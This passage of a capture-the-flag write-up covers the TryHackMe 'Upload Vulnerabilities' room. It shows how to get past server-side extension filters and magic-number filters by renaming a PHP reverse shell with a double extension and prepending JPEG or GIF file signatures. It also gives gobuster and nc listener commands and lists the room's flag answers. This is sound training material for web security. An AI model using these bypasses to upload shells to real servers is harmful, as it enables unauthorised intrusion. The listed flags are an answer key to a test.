``` {#c2a0 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="sql"}
ACCEPT FILE FROM THE USER -- SAVE FILENAME IN VARIABLE userInput
IF STRING ".jpg" IS IN VARIABLE userInput:
    SAVE THE FILE
ELSE:
    RETURN ERROR MESSAGE
```

When we try to upload our file we get a success message. Navigating to
the `/uploads`{.markup--code .markup--p-code} directory confirms that
the payload was successfully uploaded:

<figure id="f602" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*-uDYJlnHmIhhE3yV"
class="graf-image" data-image-id="0*-uDYJlnHmIhhE3yV" data-width="617"
data-height="378" />
</figure>

Activating it, we receive our shell:

<figure id="78d4" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*El9lV1KCwUgN4Czo"
class="graf-image" data-image-id="0*El9lV1KCwUgN4Czo" data-width="875"
data-height="456" />
</figure>

This is by no means an exhaustive list of upload vulnerabilities related
to file extensions. As with everything in hacking, we are looking to
exploit flaws in code that others have written; this code may very well
be uniquely written for the task at hand. This is the really important
point to take away from this task: there are a million different ways to
implement the same feature when it comes to programming --- your
exploitation must be tailored to the filter at hand. The key to
bypassing any kind of server side filter is to enumerate and see what is
allowed, as well as what is blocked; then try to craft a payload which
can pass the criteria the filter is looking for.

Now your turn. You know the drill by now --- figure out and bypass the
filter to upload and activate a shell. Your flag is in
`/var/www/`{.markup--code .markup--p-code}. The site you\'re accessing
is `annex.uploadvulns.thm`{.markup--code .markup--p-code}.

Be aware that this task has also implemented a randomised naming scheme
for the first time. For now you shouldn't have any trouble finding your
shell, but be aware that directories will not always be indexable...

[http://annex.uploadvulns.thm/privacy/](http://annex.uploadvulns.thm/privacy/){.markup--anchor
.markup--p-anchor data-href="http://annex.uploadvulns.thm/privacy/"
rel="noopener ugc nofollow noopener" target="_blank"}

[annex.uploadvulns.thm/privacy/2020--11--16--20--11--29-php-reverse-shell.jpg.php5](https://infosecwriteups.com/ctf-and-walkthrough-writeups/tryhackme/-/blob/master/annex.uploadvulns.thm/privacy/2020-11-16-20-11-29-php-reverse-shell.jpg.php5){.markup--anchor
.markup--p-anchor
data-href="https://infosecwriteups.com/ctf-and-walkthrough-writeups/tryhackme/-/blob/master/annex.uploadvulns.thm/privacy/2020-11-16-20-11-29-php-reverse-shell.jpg.php5"
rel="noopener ugc nofollow noopener" target="_blank"}

``` {#651e .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
nc -lnvp 9001
```

What is the flag in /var/www/?

> ***Answer: THM{MGEyYzJiYmI3ODIyM2FlNTNkNjZjYjFl}***

### Task 9 Bypassing Server-Side Filtering: Magic Numbers {#573b .graf .graf--h3 .graf-after--blockquote name="573b"}

We've already had a look at server-side extension filtering, but let's
also take the opportunity to see how magic number checking could be
implemented as a server-side filter.

As mentioned previously, magic numbers are used as a more accurate
identifier of files. The magic number of a file is a string of hex
digits, and is always the very first thing in a file. Knowing this, it's
possible to use magic numbers to validate file uploads, simply by
reading those first few bytes and comparing them against either a
whitelist or a blacklist. Bear in mind that this technique can be very
effective against a PHP based webserver; however, it can sometimes fail
against other types of webserver.

Let's take a look at an example. As per usual, we have an upload page:

<figure id="77d2" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*BzTd5LoCRwtmtXUc"
class="graf-image" data-image-id="0*BzTd5LoCRwtmtXUc" data-width="510"
data-height="301" />
</figure>

As expected, if we upload our standard shell.php file, we get an error;
however, if we upload a JPEG, the website is fine with it. All running
as per expected so far.

From the previous attempt at an upload, we know that JPEG files are
accepted, so let's try adding the JPEG magic number to the top of our
`shell.php`{.markup--code .markup--p-code} file. A quick look at the
[list of file signatures on
Wikipedia](https://en.wikipedia.org/wiki/List_of_file_signatures){.markup--anchor
.markup--p-anchor
data-href="https://en.wikipedia.org/wiki/List_of_file_signatures"
rel="noopener ugc nofollow noopener" target="_blank"} shows us that
there are several possible magic numbers of JPEG files. It shouldn\'t
matter which we use here, so let\'s just pick one
(`FF D8 FF DB`{.markup--code .markup--p-code}). We could add the ASCII
representation of these digits (ÿØÿÛ) directly to the top of the file
but it\'s often easier to work directly with the hexadecimal
representation, so let\'s cover that method.

Before we get started, let's use the `Linux`{.markup--code
.markup--p-code} file command to check the file type of our shell:

<figure id="c1fd" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*LEAvXT8CDJyNqOZO"
class="graf-image" data-image-id="0*LEAvXT8CDJyNqOZO" data-width="369"
data-height="31" />
</figure>

As expected, the command tells us that the filetype is PHP. Keep this in
mind as we proceed with the explanation.

We can see that the magic number we've chosen is four bytes long, so
let's open up the reverse shell script and add four random characters on
the first line. These characters do not matter, so for this example
we'll just use four "A"s:

<figure id="8f50" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*AtjGJ9RK3UcCfD7I"
class="graf-image" data-image-id="0*AtjGJ9RK3UcCfD7I" data-width="488"
data-height="121" />
</figure>

Save the file and exit. Next we're going to reopen the file in hexeditor
(which comes by default on Kali), or any other tool which allows you to
see and edit the shell as hex. In hexeditor the file looks like this:

<figure id="6b5f" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*SN-5GoyjXuy1qOBh"
class="graf-image" data-image-id="0*SN-5GoyjXuy1qOBh" data-width="718"
data-height="82" />
</figure>

Note the four bytes in the red box: they are all 41, which is the hex
code for a capital "A" --- exactly what we added at the top of the file
previously.

Change this to the magic number we found earlier for JPEG files:
`FF D8 FF DB`{.markup--code .markup--p-code}

<figure id="f459" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*pwGx5RV6PgYTFe6l"
class="graf-image" data-image-id="0*pwGx5RV6PgYTFe6l" data-width="714"
data-height="79" />
</figure>

Now if we save and exit the file (Ctrl + x), we can use file once again,
and see that we have successfully spoofed the filetype of our shell:

<figure id="c728" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*HgT2H0n2K_81-dJB"
class="graf-image" data-image-id="0*HgT2H0n2K_81-dJB" data-width="377"
data-height="33" />
</figure>

Perfect. Now let's try uploading the modified shell and see if it
bypasses the filter!

<figure id="e594" class="graf graf--figure graf-after--p">
<img src="https://cdn-images-1.medium.com/max/800/0*r5JUDN0FAIdcHCpB"
class="graf-image" data-image-id="0*r5JUDN0FAIdcHCpB" data-width="815"
data-height="599" />
</figure>

There we have it --- we bypassed the server-side magic number filter and
received a reverse shell.

Head to `magic.uploadvulns.thm`{.markup--code .markup--p-code} \-- it\'s
time for the last mini-challenge.

This will be the final example website you have to hack before the
challenge in task eleven; as such, we are once again stepping up the
level of basic security. The website in the last task implemented an
altered naming scheme, prepending the date and time of upload to the
file name. This task will not do so to keep it relatively easy; however,
directory indexing has been turned off, so you will not be able to
navigate to the directory containing the uploads. Instead you will need
to access the shell directly using its URI.

Bypass the magic number filter to upload a shell. Find the location of
the uploaded shell and activate it. Your flag is in
`/var/www/`{.markup--code .markup--p-code}.

GIFs only please!

47 49 46 38 37 61

GIF89a

``` {#cbb8 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
gobuster dir -u http://magic.uploadvulns.thm/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

/graphics (Status: 301)\
/assets (Status: 301)

``` {#0cc3 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
nc -lnvp 9001
```

Grab the flag from /var/www/

> ***Answer: THM{MWY5ZGU4NzE0ZDlhNjE1NGM4ZThjZDJh}***

### Task 10 Example Methodology {#c2df .graf .graf--h3 .graf-after--blockquote name="c2df"}

We've seen various different types of filter now --- both client side
and server side --- as well as the general methodology for file upload
attacks. In the next task you're going to be given a black-box file
upload challenge to complete, so let's take the opportunity to discuss
an example methodology for approaching this kind of challenge in a
little more depth. You may develop your own alternative to this method,
however, if you're new to this kind of attack, you may find the
following information useful.

We'll look at this as a step-by-step process. Let's say that we've been
given a website to perform a security audit on.

1.  [The first thing we would do is take a look at the website as a
    whole. Using browser extensions such as the aforementioned
    Wappalyzer (or by hand) we would look for indicators of what
    languages and frameworks the web application might have been built
    with. Be aware that Wappalyzer is not always 100% accurate. A good
    start to enumerating this manually would be by making a request to
    the website and intercepting the response with Burpsuite. Headers
    such as `server`{.markup--code .markup--li-code} or
    `x-powered-by`{.markup--code .markup--li-code} can be used to gain
    information about the server. We would also be looking for vectors
    of attack, like, for example, an upload page.]{#56b5}
2.  [Having found an upload page, we would then aim to inspect it
    further. Looking at the source code for client-side scripts to
    determine if there are any client-side filters to bypass would be a
    good thing to start with, as this is completely in our
    control.]{#098a}
3.  [We would then attempt a completely innocent file upload. From here
    we would look to see how our file is accessed. In other words, can
    we access it directly in an uploads folder? Is it embedded in a page
    somewhere? What's the naming scheme of the website? This is where
    tools such as Gobuster might come in if the location is not
    immediately obvious. This step is extremely important as it not only
    improves our knowledge of the virtual landscape we're attacking, it
    also gives us a baseline "accepted" file which we can base further
    testing on.]{#f85f}

- [An important Gobuster switch here is the -x switch, which can be used
  to look for files with specific extensions. For example, if you added
  `-x php,txt,html`{.markup--code .markup--li-code} to your Gobuster
  command, the tool would append `.php`{.markup--code
  .markup--li-code}, `.txt`{.markup--code .markup--li-code},
  and `.html`{.markup--code .markup--li-code} to each word in the
  selected wordlist, one at a time. This can be very useful if you\'ve
  managed to upload a payload and the server is changing the name of
  uploaded files.]{#5a8e}

1.  [Having ascertained how and where our uploaded files can be
    accessed, we would then attempt a malicious file upload, bypassing
    any client-side filters we found in step two. We would expect our
    upload to be stopped by a server side filter, but the error message
    that it gives us can be extremely useful in determining our next
    steps.]{#a717}

Assuming that our malicious file upload has been stopped by the server,
here are some ways to ascertain what kind of server-side filter may be
in place:

1.  [If you can successfully upload a file with a totally invalid file
    extension (e.g. **testingimage.invalidfileextension**) then the
    chances are that the server is using an extension blacklist to
    filter out executable files. If this upload fails then any extension
    filter will be operating on a whitelist.]{#1658}
2.  [Try re-uploading your originally accepted innocent file, but this
    time change the magic number of the file to be something that you
    would expect to be filtered. If the upload fails then you know that
    the server is using a magic number based filter.]{#bfe9}
3.  [As with the previous point, try to upload your innocent file, but
    intercept the request with Burpsuite and change the MIME type of the
    upload to something that you would expect to be filtered. If the
    upload fails then you know that the server is filtering based on
    MIME types.]{#6ca7}
4.  [Enumerating file length filters is a case of uploading a small
    file, then uploading progressively bigger files until you hit the
    filter. At that point you'll know what the acceptable limit is. If
    you're very lucky then the error message of original upload may
    outright tell you what the size limit is. Be aware that a small file
    length limit may prevent you from uploading the reverse shell we've
    been using so far.]{#4507}

You should now be well equipped to take on the challenge in task eleven

### Task 11 Challenge {#e6a8 .graf .graf--h3 .graf-after--p name="e6a8"}

It's challenge time!

Head over to **jewel.uploadvulns.thm**.

Take what you've learned in this room and use it to get a shell on this
machine. As per usual, your flag is in `/var/www/`{.markup--code
.markup--p-code}. Bear in mind that this challenge will be an
accumulation of everything you\'ve learnt so far, so there may be
multiple filters to bypass. The attached wordlist might help. Also
remember that not all webservers have a PHP backend\...

If you need a help, there are a series of hints
[here](https://muirlandoracle.co.uk/2020/06/30/file-upload-vulnerabilities-hints/){.markup--anchor
.markup--p-anchor
data-href="https://muirlandoracle.co.uk/2020/06/30/file-upload-vulnerabilities-hints/"
rel="noopener ugc nofollow noopener" target="_blank"}.

Additionally, there is a full video walkthrough available for this
challenge [here](https://youtu.be/8UPXibv_s1A){.markup--anchor
.markup--p-anchor data-href="https://youtu.be/8UPXibv_s1A"
rel="noopener ugc nofollow noopener" target="_blank"}.

Hack the machine and grab the flag from /var/www/

``` {#4d32 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
gobuster dir -u http://jewel.uploadvulns.thm/ -w /usr/share/wordlists/dirb/big.txt  -t 250
```

Hidden directory

/Content (Status: 301)\
/ADMIN (Status: 200)\
/Admin (Status: 200)\
/admin (Status: 200)\
/assets (Status: 301)\
/content (Status: 301)\
/modules (Status: 301)

### Burpsuite {#5e53 .graf .graf--h3 .graf-after--p name="5e53"}

``` {#51bb .graf .graf--pre .graf-after--h3 .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="javascript"}
HTTP/1.1 200 OK
Server: nginx/1.17.6
Date: Mon, 16 Nov 2020 22:27:20 GMT
Content-Type: application/javascript; charset=UTF-8
Content-Length: 1579
Connection: close
X-Powered-By: Express
Access-Control-Allow-Origin: *
Accept-Ranges: bytes
Cache-Control: public, max-age=0
Last-Modified: Fri, 03 Jul 2020 22:16:52 GMT
ETag: W/"62b-17316c0f820"$(document).ready(function(){let errorTimeout;const fadeSpeed=1000;function setResponseMsg(responseTxt,colour){$("#responseMsg").text(responseTxt);if(!$("#responseMsg").is(":visible")){$("#responseMsg").css({"color":colour}).fadeIn(fadeSpeed)}else{$("#responseMsg").animate({color:colour},fadeSpeed)}clearTimeout(errorTimeout);errorTimeout=setTimeout(()=>{$("#responseMsg").fadeOut(fadeSpeed)},5000)}$("#uploadBtn").click(function(){$("#fileSelect").click()});$("#fileSelect").change(function(){const fileBox=document.getElementById("fileSelect").files[0];const reader=new FileReader();reader.readAsDataURL(fileBox);reader.onload=function(event){const text={success:"File successfully uploaded",failure:"No file selected",invalid:"Invalid file type"};$.ajax("/",{data:JSON.stringify({name:fileBox.name,type:fileBox.type,file:event.target.result}),contentType:"application/json",type:"POST",success:function(data){let colour="";switch(data){case "success":colour="green";break;case "failure":case "invalid":colour="red";break}setResponseMsg(text[data],colour)}})}})});
```

**Gobuster**

``` {#48fd .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="bash"}
gobuster dir -u http://jewel.uploadvulns.thm/content -w UploadVulnsWordlist.txt -t 250 -x jpg
```

/ABH.jpg (Status: 200)\
/LKQ.jpg (Status: 200)\
/SAD.jpg (Status: 200)\
/UAD.jpg (Status: 200)

``` {#0852 .graf .graf--pre .graf-after--p .graf--preV2 code-block-mode="1" spellcheck="false" code-block-lang="yaml"}
nc -lnvp 9001
```

> ***Flag: THM{NzRlYTUwNTIzODMwMWZhMzBiY2JlZWU2}***

### Promote and Collaborate on Cybersecurity Insights {#a779 .graf .graf--h3 .graf-after--blockquote name="a779"}

We are excited to offer promotional opportunities and guest post
collaborations on our blog and website, focusing on all aspects of
cybersecurity. Whether you're an expert with valuable insights to share
or a business looking to reach a wider audience, our platform provides
the perfect space to showcase your knowledge and services. Let's work
together to enhance our community's understanding of cybersecurity!

### About the Author: {#298b .graf .graf--h3 .graf-after--p name="298b"}

[Vijay
Gupta](https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2){.markup--anchor
.markup--p-anchor
data-href="https://medium.com/@bevijaygupta/who-is-vijay-gupta-2ecad87f92a2"
rel="noopener" target="_blank"} is a cybersecurity enthusiast with
several years of experience in cyber security, [cyber crime forensics
investigation](https://play.google.com/store/books/details?id=VRz7EAAAQBAJ){.markup--anchor
.markup--p-anchor
data-href="https://play.google.com/store/books/details?id=VRz7EAAAQBAJ"
rel="noopener ugc nofollow noopener" target="_blank"}, and security
awareness training in schools and colleges. With a passion for
safeguarding digital environments and educating others about
cybersecurity best practices, Vijay has dedicated his career to
promoting cyber safety and resilience. Stay connected with Vijay Gupta
on various social media platforms and professional networks to access
valuable insights and stay updated on the latest cybersecurity trends.
:::
::::
::::::
:::::::

By [Vijay Kumar Gupta](https://medium.com/@bevijaygupta){.p-author
.h-card} on [August 26, 2024](https://medium.com/p/56729fb3b5d1).

[Canonical
link](https://medium.com/@bevijaygupta/upload-vulnerabilities-tryhackme-writeup-56729fb3b5d1){.p-canonical}

Exported from [Medium](https://medium.com) on February 9, 2026.
